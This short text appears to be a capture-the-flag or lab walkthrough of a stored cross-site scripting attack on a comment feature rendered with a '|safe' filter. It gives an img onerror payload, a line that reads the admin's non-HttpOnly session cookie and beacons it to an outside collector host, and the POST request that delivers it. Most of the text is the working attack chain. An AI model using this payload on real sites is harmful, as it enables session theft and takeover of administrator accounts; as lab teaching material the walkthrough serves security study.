An image whose source fails to load runs its `onerror` handler:

```html
<img src="x" onerror="/* your JS */" />
```

Put that as your comment **body**. When the admin bot moderates it, the `|safe`
render drops it into the page as live HTML and `onerror` fires in the admin's
browser. Inside it, read `document.cookie` (the `session` cookie is not
HttpOnly) and beacon it to the collector:

```js
new Image().src = 'http://collector:9000/report?c=' + encodeURIComponent(document.cookie);
```

Post it with a plain request, e.g. `POST /comment` with JSON
`{"body":"<img …>"}`.
